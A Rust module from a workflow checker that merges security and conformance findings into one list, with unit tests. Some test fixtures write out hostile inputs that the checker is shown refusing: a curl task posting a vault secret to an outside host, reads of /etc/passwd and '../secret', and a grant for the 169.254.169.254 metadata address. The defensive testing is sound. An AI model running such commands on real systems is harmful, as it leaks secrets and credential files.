// SPDX-License-Identifier: AGPL-3.0-or-later
// Copyright (C) 2024-2026 SuperNovae Studio <contact@supernovae.studio>

//! The UNIFIED findings list (#331) — every finding class, one shape,
//! one loop.
//!
//! A failing report scatters findings across ten sibling keys and only
//! `clean: bool` aggregates — a consumer had to hardcode the key list,
//! and a new class broke every consumer SILENTLY. `findings[]` is the
//! aggregation: the per-class keys stay (the typed surface), this is
//! the renderable one. The completeness ratchet lives in this module's
//! tests: `is_clean() ⇔ findings().is_empty()` is asserted per class,
//! so an eleventh finding class that forgets to join the fold turns a
//! test red instead of a consumer blind.

use serde::Serialize;

use crate::SecretLeak;

use super::ByteSpan;
use super::{CheckReport, FindingSeverity};

/// One finding, class-erased: the stable discriminator is [`Self::kind`]
/// (a closed slug set — additive only), the ladder section is
/// [`Self::gate`] (the same grep-stable keyword the human render
/// prints), and `code`/`docs_url` ride ONLY when a canonical spec code
/// exists for the class (the analysis-native classes are report-only by
/// design — a conjured code would 404).
#[derive(Debug, Clone, Serialize)]
#[non_exhaustive]
pub struct UnifiedFinding {
    /// The class slug (`conformance` · `secret_leak` · `secret_egress` ·
    /// `capability_escape` · `exec_floor` · `permit_taint` · `data_sink` ·
    /// `consent` · `trifecta` · `schema_type` · `gate` ·
    /// `run_decl` · `write_conflict` · `composition` · `unknown_tool` ·
    /// `unknown_arg` · `missing_arg` · `schema_lint`).
    pub kind: &'static str,
    /// The ladder section the human render files this under.
    pub gate: &'static str,
    /// Engine-stamped severity (every class is a run-blocker today).
    pub severity: FindingSeverity,
    /// The canonical spec code, when the class carries one.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub code: Option<String>,
    /// The per-code docs page (rides with `code`).
    #[serde(skip_serializing_if = "Option::is_none")]
    pub docs_url: Option<String>,
    /// The human row — same wording family as the rendered report.
    pub message: String,
    /// The offending task, when the finding names one.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub task: Option<String>,
    /// The source byte range, when the finding carries one.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub span: Option<ByteSpan>,
}

impl UnifiedFinding {
    fn new(kind: &'static str, gate: &'static str, message: String) -> Self {
        Self {
            kind,
            gate,
            severity: FindingSeverity::Error,
            code: None,
            docs_url: None,
            message,
            task: None,
            span: None,
        }
    }
}

/// The write-write class (F-P15 · NEP-0014 law 1 · NIKA-SEC-012) — the
/// detail names the racing tasks + the colliding literal path, the fix
/// carries the two repairs (order · merge). The fold follows the
/// run-decl precedent (one arm, its own fn · the 100-line ratchet).
fn fold_write_conflicts(report: &CheckReport, out: &mut Vec<UnifiedFinding>) {
    for w in &report.write_conflicts {
        let mut f = UnifiedFinding::new(
            "write_conflict",
            "WRITES",
            format!("{} (task `{}`) — fix: {}", w.detail, w.task, w.fix),
        );
        f.code = Some(w.wire_code().to_owned());
        f.docs_url = Some(format!("{}/{}", super::ERROR_DOCS_BASE, w.wire_code()));
        f.task = Some(w.task.clone());
        out.push(f);
    }
}

/// The composition fold (spec 14) — split out of [`collect`] at the
/// 100-line cap (the `fold_tools` precedent).
fn fold_composition(report: &CheckReport, out: &mut Vec<UnifiedFinding>) {
    for c in &report.composition {
        // spec 14 — the row already names task · target · law · repair.
        let mut f = UnifiedFinding::new(
            "composition",
            "COMPOSITION",
            format!("{} → `{}` — {}", c.task, c.target, c.detail),
        );
        f.code = Some(c.code.to_owned());
        f.docs_url = Some(format!("{}/{}", super::ERROR_DOCS_BASE, c.code));
        f.task = Some(c.task.clone());
        f.span = Some(c.span);
        out.push(f);
    }
}

/// The fix text for one refused edge — names the LAYER that failed (the
/// 2026-07-29 audit · run 4): a full sanction teach only when no
/// `egress:` exists; an author who already declassified gets the missing
/// rung — the sink to add, the host to align, or the capability layer
/// (`permits.net.http`) the sanction narrows against, never widens.
fn leak_fix(l: &SecretLeak) -> String {
    use super::declass::LeakReason as R;
    match &l.reason {
        R::NoEgress => format!(
            "fix: sanction it — `egress: [{{ to: \"{}\" }}]` on `secrets.{}`",
            l.sink_id, l.secret
        ),
        R::SinkNotCleared { sink } => format!(
            "fix: add `\"{sink}\"` to the `to:` list of the existing `egress:` on `secrets.{}`",
            l.secret
        ),
        R::HostMismatch { declared, actual } => format!(
            "fix: the `egress:` `host:` ({declared}) must equal the sink's literal destination ({actual}) — a host clears only itself"
        ),
        R::CapabilityMissing { host } => format!(
            "fix: the `egress:` exists — the missing layer is capability: add \"{host}\" to `permits.net.http` (the sanction narrows, never widens, permits)"
        ),
        R::DerivedDestination => {
            "fix: the destination is derived (`${{ }}`-built) — a sanction needs a static-literal destination host"
                .to_owned()
        }
        R::SelfShapeBroken => format!(
            "fix: `host_from_self` needs the destination to be exactly `${{{{ secrets.{} }}}}` with no other secret in the payload (the non-occlusion guard)",
            l.secret
        ),
    }
}

/// The secrets half of the fold (leaks + output egresses) — extracted
/// under the fn-length law; one class, one wire code each.
fn push_secret_rows(out: &mut Vec<UnifiedFinding>, report: &CheckReport) {
    for l in &report.secret_leaks {
        let mut f = UnifiedFinding::new(
            "secret_leak",
            "SECRETS",
            format!(
                "leak into {} (task `{}`) — {} · {}",
                l.sink,
                l.task,
                l.trace,
                leak_fix(l)
            ),
        );
        // W4 (spec 10): the flow refusal carries its wire code — the
        // message keeps the TaintTrace verbatim (it IS the witness).
        f.code = Some("NIKA-SEC-006".to_owned());
        f.docs_url = Some(format!("{}/NIKA-SEC-006", super::ERROR_DOCS_BASE));
        f.task = Some(l.task.clone());
        out.push(f);
    }
    for e in &report.secret_egresses {
        let mut f = UnifiedFinding::new(
            "secret_egress",
            "SECRETS",
            format!("EGRESS via outputs.{} — {}", e.output, e.trace),
        );
        // NIKA-SEC-007 — a tainted value reaches the workflow boundary.
        f.code = Some("NIKA-SEC-007".to_owned());
        f.docs_url = Some(format!("{}/NIKA-SEC-007", super::ERROR_DOCS_BASE));
        out.push(f);
    }
}

/// Wire `findings[].message` for a CONFORM row. The typed
/// `conformance[].message` stays `SchemaError` Display so the human
/// renderer does not double-print the explain hand-off it already
/// carries on the `fix:` line.
fn conform_row_message(c: &super::ConformanceViolation) -> String {
    format!("{} · → nika explain {}", c.message, c.code)
}

/// The spec family is the ladder keyword. Envelope refusals are
/// `NIKA-PARSE-*` even when the analyzer (not `parse()`) emits them —
/// a `CONFORM` row for a parse code is a second well the agent cannot
/// explain from.
fn kind_and_gate(code: &str) -> (&'static str, &'static str) {
    if code.starts_with("NIKA-PARSE-") {
        ("parse", "PARSE")
    } else {
        ("conformance", "CONFORM")
    }
}

/// Fold every class into the one list — conformance first (the ladder's
/// own order), then the analysis classes in render order.
pub(super) fn collect(report: &CheckReport) -> Vec<UnifiedFinding> {
    let mut out = Vec::new();
    for c in &report.conformance {
        // Same well as `SchemaDiagnostic` Display minus `[CODE] ` — wasm
        // `check()` and CLI `--json` PARSE already project this; the
        // human CONFORM row keeps `c.message` and its own `fix:` line.
        // Gate follows the spec family (`NIKA-PARSE-*` → PARSE).
        let (kind, gate) = kind_and_gate(&c.code);
        let mut f = UnifiedFinding::new(kind, gate, conform_row_message(c));
        f.code = Some(c.code.clone());
        f.docs_url = Some(c.docs_url.clone());
        f.span = c.span;
        out.push(f);
    }
    push_secret_rows(&mut out, report);
    for c in &report.capability_escapes {
        let mut f = UnifiedFinding::new(
            "capability_escape",
            "PERMITS",
            match &c.fix {
                Some(fix) => format!("{} (task `{}`) — fix: {}", c.detail, c.task, fix),
                None => format!("{} (task `{}`)", c.detail, c.task),
            },
        );
        // The wire code the RUN would emit for the same violation: the
        // always-on SSRF floor speaks NIKA-SEC-005, an effect judged
        // against the F-O8 zero boundary (no `permits:` declared) speaks
        // NIKA-AUTH-006, the declared permits boundary NIKA-SEC-004
        // (spec 05-errors) — check≡run down to the code.
        let code = if c.floor {
            "NIKA-SEC-005"
        } else if c.undeclared {
            "NIKA-AUTH-006"
        } else {
            "NIKA-SEC-004"
        };
        f.code = Some(code.to_owned());
        f.docs_url = Some(format!("{}/{code}", super::ERROR_DOCS_BASE));
        f.task = Some(c.task.clone());
        out.push(f);
    }
    fold_idle_doors(report, &mut out);
    fold_permit_taints(report, &mut out);
    fold_sink_findings(report, &mut out);
    fold_exec_floor(report, &mut out);
    fold_consent(report, &mut out);
    fold_trifecta(report, &mut out);
    fold_order(report, &mut out);
    for s in &report.schema_findings {
        out.push(UnifiedFinding::new(
            "schema_type",
            "TYPES",
            format!("{} — {} ({})", s.reference, s.detail, s.site),
        ));
    }
    for g in &report.gate_findings {
        let mut f = UnifiedFinding::new(
            "gate",
            "GATES",
            match &g.fix {
                Some(fix) => format!("{} (task `{}`) — fix: {}", g.detail, g.task, fix),
                None => format!("{} (task `{}`)", g.detail, g.task),
            },
        );
        // The wire code (DAG-006 statically dead · DAG-007 bad status
        // literal — spec 05-errors) · one-voice: the refusal names it.
        let code = g.kind.wire_code();
        f.code = Some(code.to_owned());
        f.docs_url = Some(format!("{}/{code}", super::ERROR_DOCS_BASE));
        f.task = Some(g.task.clone());
        f.span = g.span;
        out.push(f);
    }
    fold_run_decl(report, &mut out);
    fold_write_conflicts(report, &mut out);
    fold_composition(report, &mut out);
    fold_tools(report, &mut out);
    fold_slots(report, &mut out);
    for l in &report.schema_lints {
        let mut f = UnifiedFinding::new(
            "schema_lint",
            "SCHEMA",
            format!("{} — {} (task `{}`)", l.path, l.detail, l.task),
        );
        f.task = Some(l.task.clone());
        out.push(f);
    }
    out
}

/// The argv exec-floor class (#605 · NIKA-SEC-001) — the finding's own
/// code is the one the run stamps on the same refusal (check ≡ run down
/// to the code); the fold follows the sink/run-decl precedent.
fn fold_exec_floor(report: &CheckReport, out: &mut Vec<UnifiedFinding>) {
    for e in &report.exec_floor_findings {
        let mut f = UnifiedFinding::new(
            "exec_floor",
            "EXEC",
            format!("{} (task `{}`) — fix: {}", e.detail, e.task, e.fix),
        );
        f.code = Some(e.wire_code().to_owned());
        f.docs_url = Some(format!("{}/{}", super::ERROR_DOCS_BASE, e.wire_code()));
        f.task = Some(e.task.clone());
        out.push(f);
    }
}

/// The permit-taint class (NEP-0004 · the check-time twin of the runtime
/// re-gate) — the wire code is the finding's own kind (law 1 →
/// NIKA-AUTH-007 · law 2 → NIKA-AUTH-008 · ONE match arm, every surface).
fn fold_permit_taints(report: &CheckReport, out: &mut Vec<UnifiedFinding>) {
    for t in &report.permit_taints {
        let mut f = UnifiedFinding::new(
            "permit_taint",
            "PERMITS",
            match &t.fix {
                Some(fix) => format!("{} (task `{}`) — fix: {}", t.detail, t.task, fix),
                None => format!("{} (task `{}`)", t.detail, t.task),
            },
        );
        let code = t.wire_code();
        f.code = Some(code.to_owned());
        f.docs_url = Some(format!("{}/{code}", super::ERROR_DOCS_BASE));
        f.task = Some(t.task.clone());
        out.push(f);
    }
}

/// The data-as-code sink class (NEP-0006 · NIKA-SEC-008) — the detail
/// names the class + extension, the fix carries both repairs.
fn fold_sink_findings(report: &CheckReport, out: &mut Vec<UnifiedFinding>) {
    for s in &report.sink_findings {
        let mut f = UnifiedFinding::new(
            "data_sink",
            "PERMITS",
            format!("{} (task `{}`) — fix: {}", s.detail, s.task, s.fix),
        );
        let code = s.wire_code();
        f.code = Some(code.to_owned());
        f.docs_url = Some(format!("{}/{code}", super::ERROR_DOCS_BASE));
        f.task = Some(s.task.clone());
        out.push(f);
    }
}

/// The affirmative-consent class (NEP-0020 · NIKA-SEC-014) — the detail
/// names the gate AND the sink and teaches the affirmative pattern; the
/// code is the finding's own const (one voice with the
/// extra-conformance list).
fn fold_consent(report: &CheckReport, out: &mut Vec<UnifiedFinding>) {
    for c in &report.consent_findings {
        let mut f = UnifiedFinding::new("consent", "CONSENT", c.detail.clone());
        f.code = Some(crate::ConsentFinding::WIRE_CODE.to_owned());
        f.docs_url = Some(format!(
            "{}/{}",
            super::ERROR_DOCS_BASE,
            crate::ConsentFinding::WIRE_CODE
        ));
        f.task = Some(c.sink.clone());
        out.push(f);
    }
}

/// The order-law class (spec 10 · NIKA-SEC-015) — the detail carries the
/// PATH, which is the witness: a refusal that named only the two ends
/// would leave the author hunting for the edge that carried the content.
fn fold_order(report: &CheckReport, out: &mut Vec<UnifiedFinding>) {
    for o in &report.order_findings {
        let code = crate::OrderFinding::WIRE_CODE;
        let mut f = UnifiedFinding::new("order", "ORDER", o.detail.clone());
        f.code = Some(code.to_owned());
        f.docs_url = Some(format!("{}/{code}", super::ERROR_DOCS_BASE));
        f.task = Some(o.sink.clone());
        out.push(f);
    }
}

/// The authored-doors class (spec 10 rule 6 · NIKA-AUTH-011) — the
/// detail names the law the door claims and the reason it never fires,
/// because a door is only reviewable when both halves are visible.
fn fold_idle_doors(report: &CheckReport, out: &mut Vec<UnifiedFinding>) {
    for l in &report.lift_findings {
        let code = crate::LiftFinding::WIRE_CODE;
        let mut f = UnifiedFinding::new("lift", "LIFT", l.detail.clone());
        f.code = Some(code.to_owned());
        f.docs_url = Some(format!("{}/{code}", super::ERROR_DOCS_BASE));
        f.task = Some(l.task.clone());
        out.push(f);
    }
}

/// The lethal-trifecta class (NEP-0002 · NIKA-SEC-009) — the detail opens
/// with the NEP's verbatim message and names the ungated egress task (the
/// witness).
fn fold_trifecta(report: &CheckReport, out: &mut Vec<UnifiedFinding>) {
    for t in &report.trifecta_findings {
        let mut f = UnifiedFinding::new("trifecta", "TRIFECTA", t.detail.clone());
        f.code = Some("NIKA-SEC-009".to_owned());
        f.docs_url = Some(format!("{}/NIKA-SEC-009", super::ERROR_DOCS_BASE));
        f.task = Some(t.task.clone());
        out.push(f);
    }
}

/// The run-declaration class (F-P3 · `entropy: none` contradicted by a
/// structural entropy source) — the fold follows the trifecta/sink
/// precedent (one arm, its own fn · the 100-line ratchet).
fn fold_run_decl(report: &CheckReport, out: &mut Vec<UnifiedFinding>) {
    for r in &report.run_decl_findings {
        let mut f = UnifiedFinding::new(
            "run_decl",
            "RUN",
            format!("{} (task `{}`) — fix: {}", r.detail, r.task, r.fix),
        );
        let code = r.wire_code();
        f.code = Some(code.to_owned());
        f.docs_url = Some(format!("{}/{code}", super::ERROR_DOCS_BASE));
        f.task = Some(r.task.clone());
        out.push(f);
    }
}

/// The unfilled-scaffold class (#1066) — report-only by design: no spec
/// code exists for « you have not written this yet », and a conjured one
/// would 404. The message names the path, and the render names the line
/// beside it; the WORDING is the whole point of the class, so it stays
/// an instruction rather than an accusation.
fn fold_slots(report: &CheckReport, out: &mut Vec<UnifiedFinding>) {
    for s in &report.slot_findings {
        let mut f = UnifiedFinding::new(
            "slot",
            "SLOTS",
            format!("`{}` is still the scaffold's — {}", s.path, s.hint),
        );
        f.span = Some(s.span);
        out.push(f);
    }
}

/// The three tool-contract classes (all BUILTIN-coded, TOOLS/ARGS gates).
fn fold_tools(report: &CheckReport, out: &mut Vec<UnifiedFinding>) {
    let builtin_code = || Some("NIKA-BUILTIN-001".to_owned());
    let builtin_url = || Some(format!("{}/NIKA-BUILTIN-001", super::ERROR_DOCS_BASE));
    for t in &report.unknown_tools {
        let mut f = UnifiedFinding::new(
            "unknown_tool",
            "TOOLS",
            match &t.suggestion {
                Some(s) => format!(
                    "`{}` names no canonical builtin (task `{}`) — did you mean `{s}`?",
                    t.tool, t.task
                ),
                None => format!(
                    "`{}` names no canonical builtin (task `{}`)",
                    t.tool, t.task
                ),
            },
        );
        f.code = builtin_code();
        f.docs_url = builtin_url();
        f.task = Some(t.task.clone());
        out.push(f);
    }
    for a in &report.unknown_args {
        let mut f = UnifiedFinding::new(
            "unknown_arg",
            "ARGS",
            match &a.suggestion {
                Some(s) => format!(
                    "`{}` is not an arg of `{}` (task `{}`) — did you mean `{s}`?",
                    a.arg, a.tool, a.task
                ),
                // No honest guess (a wrong-name-entirely miss) — the
                // closed declared set IS the teaching.
                None => format!(
                    "`{}` is not an arg of `{}` (task `{}`) — declared: {}",
                    a.arg,
                    a.tool,
                    a.task,
                    a.declared.join(" · ")
                ),
            },
        );
        f.code = builtin_code();
        f.docs_url = builtin_url();
        f.task = Some(a.task.clone());
        out.push(f);
    }
    for m in &report.missing_args {
        let mut f = UnifiedFinding::new(
            "missing_arg",
            "ARGS",
            format!("`{}` requires arg `{}` (task `{}`)", m.tool, m.arg, m.task),
        );
        f.code = builtin_code();
        f.docs_url = builtin_url();
        f.task = Some(m.task.clone());
        out.push(f);
    }
}

/// Every TYPED rename this report offers `--fix` — `(offending, target,
/// kind)`, deduped and order-stable. The ONE derivation of « what would
/// `--fix` actually apply »: the repair ladder splices exactly these,
/// and the `check` footer decides whether to NAME `--fix` from the same
/// answer.
///
/// One function, two readers, by construction. They were two: the
/// ladder applied typed renames while the footer offered `--fix`
/// whenever any hint existed — so a CLEAN file carrying one advisory
/// hint was told to run a repair that had nothing to repair, and the
/// re-check printed the identical advice (#1177). A hint is ADVISORY:
/// `--fix` never applies one, and only a shared predicate keeps the
/// offer honest when the ladder grows a new arm.
#[must_use]
pub fn typed_renames(report: &crate::CheckReport) -> Vec<(String, String, &'static str)> {
    let mut renames: Vec<(String, String, &'static str)> = Vec::new();
    for t in &report.unknown_tools {
        if let Some(s) = &t.suggestion {
            renames.push((t.tool.clone(), s.clone(), "tool"));
        }
    }
    for a in &report.unknown_args {
        if let Some(s) = &a.suggestion {
            renames.push((a.arg.clone(), s.clone(), "arg"));
        }
    }
    // Conformance renames (typed `offending`/`suggestion` — an unknown
    // `after:`/`with:` edge target rides the BARE task name · an
    // unresolved `${{ }}` ref rides fully qualified so a splice keeps
    // the namespace).
    for v in &report.conformance {
        if let (Some(o), Some(s)) = (&v.offending, &v.suggestion) {
            renames.push((o.clone(), s.clone(), "ref"));
        }
    }
    renames.sort();
    renames.dedup();
    renames
}

#[cfg(test)]
mod tests {
    use nika_schema::parser::{ParseMode, parse};
    use nika_schema::source::FileId;

    fn report(yaml: &str) -> crate::CheckReport {
        crate::check(&parse(yaml, FileId::new(0), ParseMode::Strict).expect("fixture parses"))
    }

    /// THE completeness ratchet: `is_clean()` and `findings.is_empty()`
    /// are the same statement — a new finding class that updates
    /// `is_clean` but forgets the fold turns this red (per-class
    /// fixtures below make the direction concrete).
    #[test]
    fn clean_report_has_zero_findings() {
        let r = report(
            "nika: ok\npermits: { exec: [\"echo\"] }\ntasks:\n  a:\n    exec: { command: [\"echo\", \"x\"] }\n",
        );
        assert!(r.is_clean());
        assert!(r.findings.is_empty(), "{:#?}", r.findings);
    }

    /// Per-class: every dirty fixture must surface in findings[] AND
    /// flip `is_clean` — the equivalence, exercised from the dirty side.
    #[test]
    fn each_dirty_class_lands_in_findings_with_its_gate() {
        let cases: Vec<(&str, &str, &str)> = vec![
            (
                // parse family, analyzer-emitted: `nika:` without `tasks:`
                "nika: w\n",
                "parse",
                "PARSE",
            ),
            (
                // conformance: unresolved reference
                "nika: w\ntasks:\n  a:\n    infer: { prompt: \"${{ tasks.ghost.output }}\", max_tokens: 9 }\n",
                "conformance",
                "CONFORM",
            ),
            (
                // capability escape: exec outside a declared boundary
                "nika: w\npermits: { exec: false }\ntasks:\n  a:\n    exec: { command: [\"cargo\", \"x\"] }\n",
                "capability_escape",
                "PERMITS",
            ),
            (
                // unknown tool (typo'd builtin)
                "nika: w\ntasks:\n  a:\n    invoke: { tool: \"nika:raed\", args: { path: \"./x\" } }\n",
                "unknown_tool",
                "TOOLS",
            ),
            (
                // missing required arg
                "nika: w\ntasks:\n  a:\n    invoke: { tool: \"nika:write\", args: { path: \"./x\" } }\n",
                "missing_arg",
                "ARGS",
            ),
            (
                // composition: a templated child target (the PURE half of
                // the spec-14 lane — fires in every check(), reader-less)
                "nika: w\nconst:\n  v: \"a\"\ntasks:\n  a:\n    invoke: { workflow: \"./x-${{ const.v }}.nika.yaml\" }\n",
                "composition",
                "COMPOSITION",
            ),
            (
                // trifecta: all three legs declared + an ungated egress the
                // untrusted content REACHES (NEP-0002 v2.0 · the second
                // fetch's url rides the first's untrusted output)
                "nika: w\npermits:\n  fs: { read: [\"./inbox/**\"] }\n  net: { http: [\"api.example.com\"] }\n  tools: [\"nika:fetch\"]\ntasks:\n  a:\n    invoke:\n      tool: \"nika:fetch\"\n      args: { url: \"https://api.example.com/x\" }\n  b:\n    with: { d: \"${{ tasks.a.output }}\" }\n    invoke:\n      tool: \"nika:fetch\"\n      args: { url: \"https://api.example.com/${{ with.d }}\" }\n",
                "trifecta",
                "TRIFECTA",
            ),
            (
                // write-write (F-P15 · NEP-0014 law 1): two incomparable
                // writers on one literal path — the boundary declares the
                // writes, the ORDER is what the file never declares
                "nika: w\npermits:\n  fs: { write: [\"out/**\"] }\n  tools: [\"nika:write\"]\ntasks:\n  left:\n    invoke: { tool: \"nika:write\", args: { path: out/report.md, content: \"a\" } }\n  right:\n    invoke: { tool: \"nika:write\", args: { path: out/report.md, content: \"b\" } }\n",
                "write_conflict",
                "WRITES",
            ),
        ];
        for (yaml, kind, gate) in cases {
            let r = report(yaml);
            assert!(!r.is_clean(), "fixture must be dirty for {kind}");
            let hit = r
                .findings
                .iter()
                .find(|f| f.kind == kind)
                .unwrap_or_else(|| panic!("{kind} missing from findings: {:#?}", r.findings));
            assert_eq!(hit.gate, gate);
        }
    }

    /// The canonical-code law: conformance + escapes + secret-flow +
    /// the law + tool-contract classes carry a code AND its docs url;
    /// analysis-native classes carry neither (a conjured code would 404).
    /// W4: the two flow refusals were report-only until the canon
    /// registered NIKA-SEC-006/007 (spec 10 §secret flow refusals).
    #[test]
    fn codes_ride_only_where_canonical() {
        let r = report(
            "nika: w\npermits: { exec: false }\ntasks:\n  a:\n    exec: { command: [\"cargo\", \"x\"] }\n",
        );
        let escape = r
            .findings
            .iter()
            .find(|f| f.kind == "capability_escape")
            .expect("escape");
        assert_eq!(escape.code.as_deref(), Some("NIKA-SEC-004"));
        assert_eq!(
            escape.docs_url.as_deref(),
            Some("https://nika.sh/language/errors/NIKA-SEC-004")
        );
        assert_eq!(escape.task.as_deref(), Some("a"));

        // secret_leak → NIKA-SEC-006 · secret_egress → NIKA-SEC-007 —
        // the message keeps the taint trace verbatim (it IS the witness).
        let r = report(
            "nika: w\nsecrets:\n  k: { source: vault, key: x }\ntasks:\n  a:\n    exec: { command: [\"curl\", \"-d\", \"${{ secrets.k }}\", \"https://x.test\"] }\noutputs:\n  loot: ${{ secrets.k }}\n",
        );
        let leak = r
            .findings
            .iter()
            .find(|f| f.kind == "secret_leak")
            .expect("leak");
        assert_eq!(leak.code.as_deref(), Some("NIKA-SEC-006"));
        assert_eq!(
            leak.docs_url.as_deref(),
            Some("https://nika.sh/language/errors/NIKA-SEC-006")
        );
        assert!(
            leak.message.contains("secrets.k"),
            "the taint trace stays the witness: {}",
            leak.message
        );
        let egress = r
            .findings
            .iter()
            .find(|f| f.kind == "secret_egress")
            .expect("egress");
        assert_eq!(egress.code.as_deref(), Some("NIKA-SEC-007"));
        assert_eq!(
            egress.docs_url.as_deref(),
            Some("https://nika.sh/language/errors/NIKA-SEC-007")
        );

        // trifecta → NIKA-SEC-009 (NEP-0002) — the code rides with the
        // witness task (the SINK the content reaches · v2.0), one voice
        // with the conformance-code surface.
        let r = report(
            "nika: w\npermits:\n  fs: { read: [\"./inbox/**\"] }\n  net: { http: [\"api.example.com\"] }\n  tools: [\"nika:fetch\"]\ntasks:\n  a:\n    invoke:\n      tool: \"nika:fetch\"\n      args: { url: \"https://api.example.com/x\" }\n  b:\n    with: { d: \"${{ tasks.a.output }}\" }\n    invoke:\n      tool: \"nika:fetch\"\n      args: { url: \"https://api.example.com/${{ with.d }}\" }\n",
        );
        let tri = r
            .findings
            .iter()
            .find(|f| f.kind == "trifecta")
            .expect("trifecta row");
        assert_eq!(tri.code.as_deref(), Some("NIKA-SEC-009"));
        assert_eq!(
            tri.docs_url.as_deref(),
            Some("https://nika.sh/language/errors/NIKA-SEC-009")
        );
        assert_eq!(tri.task.as_deref(), Some("b"), "the sink is the witness");
    }

    /// The wire shape: absent optionals are ABSENT (never null) — the
    /// consumer's loop reads {kind, gate, severity, message} on every
    /// row and the rest only when present.
    #[test]
    fn serialization_skips_absent_optionals() {
        let r = report(
            "nika: w\ntasks:\n  a:\n    infer: { prompt: \"${{ tasks.ghost.output }}\", max_tokens: 9 }\n",
        );
        let json = serde_json::to_value(&r.findings).expect("serializes");
        let row = &json[0];
        assert_eq!(row["kind"], "conformance");
        assert_eq!(row["severity"], "error");
        assert!(row.get("task").is_none(), "absent, not null: {row}");
        assert!(row.get("code").is_some());
        let code = row["code"].as_str().expect("code");
        let message = row["message"].as_str().expect("message");
        assert!(
            message.ends_with(&format!("· → nika explain {code}")),
            "CONFORM JSON shares the diagnostic well: {row}"
        );
    }

    /// F-P5 (c) · the `*.` wildcard in `permits.net.http` is a hard
    /// refusal at check — the finding lands in findings[] with its wire
    /// code (NIKA-AUTH-010) so the run gate blocks on it.
    #[test]
    fn a_wildcard_net_http_entry_is_an_error_finding() {
        let r = report(
            "nika: w\npermits:\n  net: { http: [\"*.github.com\"] }\n  tools: [\"nika:fetch\"]\ntasks:\n  t:\n    invoke: { tool: \"nika:fetch\", args: { url: \"https://api.github.com/x\" } }\n",
        );
        assert!(!r.is_clean(), "the wildcard is a run-blocker");
        let hit = r
            .findings
            .iter()
            .find(|f| f.kind == "permit_taint")
            .expect("the wildcard finding");
        assert_eq!(hit.code.as_deref(), Some("NIKA-AUTH-010"));
        assert_eq!(hit.severity, super::FindingSeverity::Error);
        assert!(hit.message.contains("net.http[0]"), "{}", hit.message);
    }

    /// F-P5 (d) · the dead-grant twin of NIKA-AUTH-009 (env): a
    /// floor-blocked `permits.net.http` entry is an inert grant — flagged
    /// at the ENTRY with the floor code (check≡run down to the code: the
    /// run refuses the same target with NIKA-SEC-005).
    #[test]
    fn a_floor_blocked_net_http_entry_is_a_dead_grant_finding() {
        let r = report(
            "nika: w\npermits:\n  net: { http: [\"169.254.169.254\", \"api.x.com\"] }\n  tools: [\"nika:fetch\"]\ntasks:\n  t:\n    invoke: { tool: \"nika:fetch\", args: { url: \"https://api.x.com/x\" } }\n",
        );
        assert!(!r.is_clean());
        let hit = r
            .findings
            .iter()
            .find(|f| f.kind == "capability_escape" && f.task.as_deref() == Some("permits"))
            .expect("the dead-grant entry finding");
        assert_eq!(hit.code.as_deref(), Some("NIKA-SEC-005"));
        assert!(hit.message.contains("169.254.169.254"), "{}", hit.message);
        assert!(
            hit.message.contains("can never take effect"),
            "the dead-grant teaching: {}",
            hit.message
        );
    }

    /// B04 / B28 · issue 1294 — check fail-closed on a host passwd read
    /// (and the `../` climb of the same class). The repair must not
    /// teach granting the host file. `tools:` is granted so the row is
    /// the PATH, not a missing-tools conjunct.
    #[test]
    fn check_fails_closed_on_host_passwd_read() {
        let host = "nika: passwd-read\npermits:\n  tools: [\"nika:read\"]\n  fs: { read: [\"./**\"] }\ntasks:\n  p:\n    invoke: { tool: nika:read, args: { path: /etc/passwd } }\n";
        let r = report(host);
        assert!(
            !r.is_clean(),
            "check must fail-closed on a host passwd read: {:?}",
            r.capability_escapes
        );
        let hit = r
            .findings
            .iter()
            .find(|f| f.code.as_deref() == Some("NIKA-SEC-004"))
            .unwrap_or_else(|| panic!("expected NIKA-SEC-004, got {:#?}", r.findings));
        assert!(
            hit.message.contains("/etc/passwd"),
            "the finding names the host path: {}",
            hit.message
        );
        assert!(
            r.capability_escapes.iter().all(|e| {
                e.fix
                    .as_deref()
                    .is_none_or(|f| !f.contains("passwd") && !f.contains("/etc/"))
            }),
            "no shovel toward the host file: {:?}",
            r.capability_escapes
        );
        assert!(
            r.capability_escapes
                .iter()
                .any(|e| e.detail.contains("escapes the workspace") && e.fix.is_none()),
            "the host path is an escape, never a grant: {:?}",
            r.capability_escapes
        );

        let climb = "nika: passwd-climb\npermits:\n  tools: [\"nika:read\"]\n  fs: { read: [\"./**\"] }\ntasks:\n  p:\n    invoke: { tool: nika:read, args: { path: ../secret } }\n";
        let r = report(climb);
        assert!(
            !r.is_clean(),
            "check must fail-closed on a relative climb: {:?}",
            r.capability_escapes
        );
        assert!(
            r.findings
                .iter()
                .any(|f| f.code.as_deref() == Some("NIKA-SEC-004")),
            "the climb is NIKA-SEC-004: {:#?}",
            r.findings
        );

        let inside = "nika: in-tree\npermits:\n  tools: [\"nika:read\"]\n  fs: { read: [\"./**\"] }\ntasks:\n  p:\n    invoke: { tool: nika:read, args: { path: ./notes.md } }\n";
        let r = report(inside);
        assert!(
            !r.capability_escapes.iter().any(|e| e.category == "fs"),
            "an in-tree read under ./** stays granted: {:?}",
            r.capability_escapes
        );
    }
}
